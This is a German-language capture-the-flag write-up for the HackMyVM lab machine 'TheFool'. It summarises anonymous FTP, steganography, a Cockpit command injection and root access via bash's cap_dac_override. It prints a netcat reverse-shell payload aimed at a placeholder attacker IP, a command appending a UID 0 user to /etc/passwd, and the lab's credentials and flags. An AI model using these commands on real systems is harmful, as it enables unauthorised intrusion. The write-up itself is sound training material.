# TheFool - HackMyVM (Hard)
 
![TheFool.png](TheFool.png)

## Übersicht

*   **VM:** TheFool
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=TheFool)
*   **Schwierigkeit:** Hard
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 21. Oktober 2022
*   **Original-Writeup:** https://alientec1908.github.io/TheFool_HackMyVM_Hard/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel der "TheFool"-Challenge war die Erlangung von User- und Root-Rechten. Der Weg begann mit der Entdeckung eines offenen FTP-Servers (Port 21), der anonymen Zugriff erlaubte. Dort wurden die Dateien `note.txt` (Hinweis auf Morsecode) und `thefool.jpg` gefunden. Eine weitere versteckte Datei `.m0rse.wav` wurde ebenfalls über FTP heruntergeladen. Die Analyse der WAV-Datei (Morsecode) ergab den Base64-String `bWluZXJ2YTp0d2VldHk=`, der zu `minerva:tweety` dekodierte. Diese Credentials funktionierten für den Login in eine Cockpit-Instanz auf Port 9090. Durch Modifizieren einer Anfrage in Cockpit (z.B. via Burp Suite) wurde eine Reverse Shell als Benutzer `minerva` erlangt. Die User-Flag wurde in dessen Home-Verzeichnis gefunden. Die Privilegieneskalation zu Root erfolgte durch Ausnutzung der Linux Capability `cap_dac_override=ep`, die für `/usr/bin/bash` gesetzt war. Dies erlaubte das direkte Bearbeiten der `/etc/passwd`-Datei, um einen neuen Benutzer mit UID/GID 0 (`hacker:benni`) hinzuzufügen und so Root-Rechte zu erlangen.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `gobuster`
*   `ftp` (oder `lftp`)
*   `cat`
*   `stegseek`
*   `steghide` (impliziert für Steganographie-Versuche)
*   `hydra`
*   `ssh` (versucht)
*   `echo`
*   `bash`
*   `ls`
*   `sudo`
*   `find`
*   `vi` / `nano`
*   `gcc`
*   `python3` (für Brute-Force-Skript und Shell-Stabilisierung)
*   `mv`
*   `chmod`
*   `wget`
*   `id`
*   `cd`
*   `pwd`
*   `nc` (netcat)
*   `getcap`
*   `mkpasswd`
*   `base64` (Decoder)
*   `requests` (Python-Modul)
*   `Burp Suite` (impliziert für Cockpit Exploit)
*   `Metasploit` (msf6)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "TheFool" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Service Enumeration:**
    *   IP-Findung mit `arp-scan` (`192.168.2.107`).
    *   `nmap`-Scan identifizierte offene Ports: 21 (FTP - vsftpd 3.0.3, anonymer Login erlaubt), 80 (HTTP - Nginx 1.18.0), 9090 (SSL/HTTP - später als Cockpit identifiziert).
    *   FTP-Enumeration: Download von `note.txt` (Hinweis auf Morsecode) und `thefool.jpg`.
    *   `stegseek` auf `thefool.jpg` fand mit leerer Passphrase eine Nachricht von `minerva`.
    *   Erneuter FTP-Login fand und lud die versteckte Datei `.m0rse.wav` herunter.
    *   Analyse der `.m0rse.wav` (Morsecode-Dekodierung) ergab den Base64-String `bWluZXJ2YTp0d2VldHk=`.
    *   Dekodierung zu `minerva:tweety`.

2.  **Initial Access (Cockpit Exploit zu `minerva`):**
    *   Identifizierung von Port 9090 als Cockpit-Instanz (`https://192.168.2.107:9090/`).
    *   Ein Python-Skript wurde erstellt, um Cockpit-Logins via HTTP Basic Auth zu bruteforcen (bestätigte `minerva:tweety`, obwohl dies bereits bekannt war).
    *   Login in Cockpit als `minerva:tweety`.
    *   Modifizieren einer Cockpit-internen Anfrage (z.B. via Burp Suite) durch Ersetzen von Befehlsargumenten mit einem Netcat-Reverse-Shell-Payload (`["nc","-e","/bin/bash","[Angreifer-IP]","9001"]`).
    *   Erlangung einer interaktiven Shell als Benutzer `minerva`.
    *   User-Flag `GUY6dsaiuyUIYHz` in `/home/minerva/user.txt` gelesen.

3.  **Privilege Escalation (von `minerva` zu `root` via Bash Capability):**
    *   `sudo -l` für `minerva` zeigte keine direkten Rechte. SUID-Binaries waren Standard.
    *   Metasploit `local_exploit_suggester` schlug u.a. Dirty Pipe vor, der Metasploit-Exploit scheiterte aber an Architektur-Mismatch.
    *   `getcap -r / 2>/dev/null` offenbarte, dass `/usr/bin/bash` die Capability `cap_dac_override=ep` besaß.
    *   Ausnutzung der `cap_dac_override`-Capability:
        1.  Generierung eines SHA-512-Passwort-Hashes für ein neues Passwort (z.B. `benni`) auf der Angreifer-Maschine (`mkpasswd -m sha-512`).
        2.  Als `minerva` (in der Bash mit `cap_dac_override`) wurde ein neuer Benutzer `hacker` mit UID/GID 0 und dem generierten Hash zur `/etc/passwd`-Datei hinzugefügt: `echo 'hacker:[hash]:0:0:root:/root:/bin/bash' >> /etc/passwd`.
        3.  Wechsel zum neuen Root-Benutzer mit `su hacker` und dem Passwort `benni`.
    *   Erlangung einer Root-Shell.
    *   Root-Flag `BMNB6s67tS67TSG` in `/root/.root.7x7` gelesen.

## Wichtige Schwachstellen und Konzepte

*   **Anonymer FTP-Zugriff:** Erlaubte den Download von Dateien, die Hinweise enthielten.
*   **Steganographie (Bild & Audio/Morsecode):** Verstecken von Informationen (Benutzername, Base64-kodierte Credentials) in Mediendateien.
*   **Schwache Cockpit-Credentials (via Morsecode/Base64):** Das Passwort für `minerva` wurde über mehrere Stufen der Informationsenthüllung gefunden.
*   **Cockpit Command Injection (manipulierte Anfrage):** Eine Webanwendungs-Schwachstelle in Cockpit erlaubte nach dem Login die Ausführung von Befehlen.
*   **Linux Capabilities (`cap_dac_override` auf Bash):** Eine extrem unsichere Konfiguration, die es Bash erlaubte, Dateiberechtigungen zu umgehen und somit `/etc/passwd` zu manipulieren.
*   **Manipulation von `/etc/passwd`:** Hinzufügen eines neuen Benutzers mit UID 0 zur Erlangung von Root-Rechten.

## Flags

*   **User Flag (`/home/minerva/user.txt`):** `GUY6dsaiuyUIYHz`
*   **Root Flag (`/root/.root.7x7`):** `BMNB6s67tS67TSG`

## Tags

`HackMyVM`, `TheFool`, `Hard`, `FTP`, `Steganography`, `Morse Code`, `Base64`, `Cockpit`, `Command Injection`, `Linux Capabilities`, `cap_dac_override`, `Bash`, `/etc/passwd`, `Privilege Escalation`, `Linux`, `Web`
